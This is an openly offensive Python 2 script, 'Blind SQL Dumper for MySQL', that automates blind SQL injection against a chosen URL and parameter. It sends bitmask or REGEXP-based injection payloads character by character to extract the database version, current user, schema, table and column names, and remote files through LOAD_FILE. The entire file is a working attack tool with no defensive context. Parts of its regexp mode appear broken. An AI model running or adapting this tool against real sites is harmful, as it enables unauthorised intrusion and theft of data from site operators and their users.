#!/usr/bin/python
import getopt
import sys
import pprint
import urlparse
import urllib
import httplib

params = {}

def get_byte_range(str):
	if str.find('empty (sub)expression'):			return [make_range(11, 20), make_range(21, 30)]
	elif str.find('parentheses not balanced'):		return [make_range(31, 40), make_range(41, 50)]
	elif str.find('brackets ([ ]) not balanced'):		return [make_range(51, 60), make_range(61, 70)]
	elif str.find('trailing backslash (\)'):		return [make_range(71, 80), make_range(81, 90)]
	elif str.find('repetition-operator operand invalid'):	return [make_range(91, 100), make_range(101, 110)]
	elif str.find('invalid repetition count(s)'):		return [make_range(111, 120), make_range(121, 130)]
	elif str.find('invalid character range'):		return [make_range(131, 140), make_range(141, 150)]
	elif str.find('braces not balanced'):			return [make_range(151, 160), make_range(161, 170)]
	elif str.find('invalid collating element'):		return [make_range(171, 180), make_range(181, 190)]
	elif str.find('invalid character class'):		return [make_range(191, 200), make_range(200, 210)]
	else: return False

def get_byte_char(byte_range, str):
	if str.find('empty (sub)expression'):			return byte_range[0]
	elif str.find('parentheses not balanced'):		return byte_range[1]
	elif str.find('brackets ([ ]) not balanced'):		return byte_range[2]
	elif str.find('trailing backslash (\)'):		return byte_range[3]
	elif str.find('repetition-operator operand invalid'):	return byte_range[4]
	elif str.find('invalid repetition count(s)'):		return byte_range[5]
	elif str.find('invalid character range'):		return byte_range[6]
	elif str.find('braces not balanced'):			return byte_range[7]
	elif str.find('invalid collating element'):		return byte_range[8]
	elif str.find('invalid character class'):		return byte_range[9]
	else: return False

def make_range(low, high):
	ret = []

	while low <= high:
		ret.append('='+ str(low))
		low += 1

	return ret

def build_injection(inj, req, row, char, mask):
	inj = inj.replace("$$REQ$$", req)
	inj = inj.replace('$$LIM$$', str(row))
	inj = inj.replace('$$CHR$$', str(char))
	inj = inj.replace('$$MSK$$', str(mask))

	return inj

def build_injection_regexp(inj, req, row, char, conds):
	inj = inj.replace("$$REQ$$", req)
	inj = inj.replace('$$LIM$$', str(row))
	inj = inj.replace('$$CHR$$', str(char))

	i = 1
	for val in conds:
		inj = inj.replace('$$CND'+ str(i) +'$$', val)
		i += 1

	return inj

def get_nb_rows():
	req = params['req'].lower()
	req = req.replace('select ', 'select count(')

	if (' from' in req):
		pos = req.find(' from')

	elif (' where' in req):
		pos = req.find(' where');

	else: pos = len(req);

	req = req[:pos] + ')' + req[pos:]

	return int(dump_row(0, True, req))

def build_params(inj):
	p = {}
	tab = params['url'].query.split('&')

	for val in tab:
		t = val.split('=')
		p[t[0]] = inj if (t[0] == params['inj_param']) else t[1]

	return p

def make_http_request(inj):

	http_params = urllib.urlencode(build_params(inj))

	headers = {'User-Agent': 'Mozilla/5.0 Firefox/4.0.1', 
	'Accept': 'text/html,text/plain',
	'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
	'Cache-Control': 'max-age=0'}

	if (params['http_cookie'] != False):
		headers['Cookie'] = params['http_cookie']

	if (params['url'].scheme == 'https'):
		handler = httplib.HTTPSConnection(params['url'].netloc)
	else:
		handler = httplib.HTTPConnection(params['url'].netloc)

	if (params['method'] == 'POST'):
		headers['Content-Type'] = 'application/x-www-form-urlencoded'
		handler.request(params['method'], params['url'].path, http_params, headers)

	else:
		handler.request(params['method'], params['url'].path +"?"+ http_params, None, headers)

	response = handler.getresponse()
	data = response.read()
	handler.close()

	return data

def dump_row(row, echo, req):
	ret = ''
	char = 1

	init_conditions = [ '<31', '<51', '<71', '<91', '<111', '<131', '<151', '<171', '<191', '<211' ]

	# Chars
	while True:
		byte = ''

		if params['type'] == 'binary':

			# Masks
			for mask in (1, 2, 4, 8, 16, 32, 64, 128):
				inj = build_injection(params['injection'], req, row, char, mask)
				html = make_http_request(inj)
				byte = ('0' if (params['match_true'] in html) else '1') + byte

		else:
			# First pass : Get range
			inj = build_injection_regexp(params['injection'], req, row, char, init_conditions)
			html = make_http_request(inj)
			byte_range = get_byte_range(html)

			if (byte_range == False): break

			# Second pass : Get char ASCII code
			inj = build_injection_regexp(params['injection'], params['req'], row, char, byte_range[0])
			html = make_http_request(inj)
			byte = get_byte_char(byte_range[0], html)

			# Third pass : if char was not in the first chunk
			if (byte == False):
				inj = build_injection_regexp(params['injection'], params['req'], row, char, byte_range[1])
				html = make_http_request(inj)
				byte = get_byte_char(byte_range[1], html)

			# Suppress the equal sign
			byte = byte[1:]


		# We have reached the last char
		if (int(byte) == 0):
			if (echo): print ""
			return ret

		ret += chr(int(byte, 2))

		if (echo):
			putchar(byte)

		char += 1

def putchar(byte):
	sys.stdout.write(chr(int(byte, 2)))
	sys.stdout.flush()

def set_defaults():
	params['req'] = 'SELECT CONCAT(version(),0x2C20,database(),0x2C20,current_user)'
	params['method'] = 'GET'
	params['verbose'] = False
	params['type'] = 'binary'
	params['url'] = False
	params['match_true'] = False
	params['inj_param'] = False
	params['log'] = False
	params['logifle'] = False
	params['dump_file'] = False
	params['dump_dbs'] = False
	params['dump_tables'] = False
	params['dump_columns'] = False
	params['http_user'] = False
	params['http_pass'] = False
	params['http_host'] = False
	params['http_port'] = False
	params['http_cookie'] = False


def tohex(s):
	lst = []
	for ch in s:
		hv = hex(ord(ch)).replace('0x', '')
		if len(hv) == 1:
			hv = '0'+hv
		lst.append(hv)

	return reduce(lambda x,y:x+y, lst)

def usage():
	print "Blind SQL Dumper for MySQL by jrm`"
	print "------------------------------------------------------------------------------------------"
	print "-h, --help                                this help"

	print "\nREQUIRED OPTIONS:"
	print "-u <url>, --url <url>                     specify target URL"
	print "-s <str>, --string <str>                  string to match on the page when query is true"
	print "-p <param>, --param <param>               specify injectable parameter, must be"
	print "                                          present in the query string"

	print "\nOPTIONAL OPTIONS:"
	print "-r <req>, --req <req>                     set a custom SQL query (must return one column,"
	print "                                          use CONCAT() if needed)"
	print "-c <cookie_str>, --cookie <cookie_str>    set an HTTP Cookie (format: var1=val1; var2=val2)"
	print "--debug                                   turn debugging on"
	print "-m <method>, --method <method>            set HTTP method ('GET' or 'POST')"
	print "-l <logfile>, --log <logfile>             save all output to <logfile>"
	print "-t <type>, --type <type>                  define injection type. possible values: 'binary', 'regexp'"
	print "                                          binary - use binary masks technique (8 reqs per char)"
	print "                                          regexp - use regexp technique (2/3 reqs per char)"
	print "                                           - need mysql_errors displayed on the page (default: binary)"
	
	print "\nDUMP OPTIONS:"
	print "--file <filename>                         dump remote file <filename>, may fail if MySQL"
	print "                                          LOAD_FILE() is disabled. may take a long time"
	print "                                          and generate a lot of traffic."
	print "--dbs                                     dump MySQL databases"
	print "--tables <database>                       dump MySQL tables from DB <database>"
	print "--columns <table>                         dump MySQL columns from table <table>"
	print "                                          (use with --tables <db_name> to set the DB name)"

	sys.exit(0);

def die(err):
	print "error:", err
	sys.exit(2);

def main():
	try:
		optlist, args = getopt.getopt(sys.argv[1:], "vhu:s:p:t:r:m:l:0:12:3:c:",
			["verbose", "help", "url=", "string=", "param=", "type=", "req=", "method=", "logfile=", "file=", "dbs", "tables=", "columns=", "cookie="])

	except getopt.GetoptError, err:
		print str(err)
		usage()

	set_defaults();
	row = 0
	
	for o, a in optlist:
		if o in ("-v", "--verbose"):
			params["verbose"] = True
		elif o in ("-h", "--help"):
			usage()
		elif o in ("-u", "--url"):
			params['url'] = urlparse.urlsplit(a)
		elif o in ("-s", "--string"):
			params['match_true'] = a
		elif o in ("-p", "--param"):
			params['inj_param'] = a
		elif o in ("-t", "--type"):
			params['type'] = a
		elif o in ("-r", "--req"):
			params['req'] = a
		elif o in ("-m", "--method"):
			params['method'] = a
		elif o in ("-l", "--logfile"):
			params['logfile'] = a
		elif o in ("-0", "--file"):
			params['dump_file'] = a
		elif o in ("-1", "--dbs"):
			params['dump_dbs'] = True
		elif o in ("-2", "--tables"):
			params['dump_tables'] = a
		elif o in ("-3", "--columns"):
			params['dump_columns'] = a
		elif o in ("-c", "--cookie"):
			params['http_cookie'] = a
		else:
			assert False, "unhandled option"

	if params['type'] not in ('binary', 'regexp'):
		die('Invalid injection type. Possible values are: binary, regexp')

	if params['url'] == False:
		die('Missing mandatory parameter: -u <url>')

	if params['inj_param'] == False:
		die('Missing mandatory parameter: -p <injectable_param>')

	if params['match_true'] == False and params['type'] == 'binary':
		die('Missing mandatory parameter: -s <string_to_match>')

	if params['verbose'] == True:
		pprint.pprint(params)

	if params['dump_dbs'] != False:
		params['req'] = 'SELECT SCHEMA_NAME FROM information_schema.SCHEMATA'

	if params['dump_tables'] != False:
		params['req'] = 'SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=0x'+ tohex(params['dump_tables'])

	if params['dump_columns'] != False:
		params['req'] = 'SELECT COLUMN_NAME FROM information_schema.columns WHERE '+ \
		(('TABLE_SCHEMA=0x'+ tohex(params['dump_tables']) + ' AND ') if (params['dump_tables'] != False) else '') + \
		'TABLE_NAME=0x'+ tohex(params['dump_columns'])

	# Additional checks
	if (params['inj_param'] not in params['url'].query):
		die('Injectable parametre not found in query string, exiting ...')
	
	if params['type'] == 'binary':
		params['injection'] = "' or (ASCII(substring(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))&$$MSK$$)=0 or ''='"
	else:
		params['injection'] = "' or (SELECT 1 REGEXP IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND0$$,'',IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND1$$,0x28,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND2$$,0x5b,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND3$$,0x5c,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND4$$,0x2a,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND5$$,0x617B312C312C317D,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND6$$,0x5B612D395D,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND7$$,0x617B31,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND8$$,0x275B5B2E61622E5D5D27,IF(ASCII(SUBSTRING(($$REQ$$ LIMIT $$LIM$$,1),$$CHR$$,1))$$CND9$$,0x5B5B3A61623A5D5D,1)))))))))))=1 or ''='"

	# Welcome Banner
	print "Blind SQL Dumper for MySQL by jrm`"
	print "------------------------------------------------"
	print "Host      :", params['url'].netloc
	print "URI       :", params['url'].path
	print "Method    :", params['method']
	print "Params    :", params['url'].query
	print "Query     :", params['req']
	print "------------------------------------------------\n"

	print "Number of rows returned by the query ..."

	n = get_nb_rows()

	print "\nDumping ..."
	while (row != n):
		dump_row(row, True, params['req'])
		row += 1

	sys.exit()

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print "\n...exiting"
		sys.exit()


